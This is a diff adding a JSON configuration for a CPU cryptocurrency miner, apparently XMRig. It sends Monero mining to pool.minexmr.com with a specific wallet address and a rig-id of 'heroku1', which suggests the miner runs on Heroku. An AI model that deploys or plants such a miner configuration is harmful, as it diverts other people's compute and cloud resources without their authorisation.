@@ -1,0 +1,15 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.minexmr.com:443",
+            "user": "4AFihysnGQw4GFdN34HaNa6xQVnj7UsHkWch9sojk47u6ncApRjebAdinYnJueFaDrHmYmmbemPSnjGwxt8JwUVyR95AG3S",
+            "rig-id": "heroku1",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
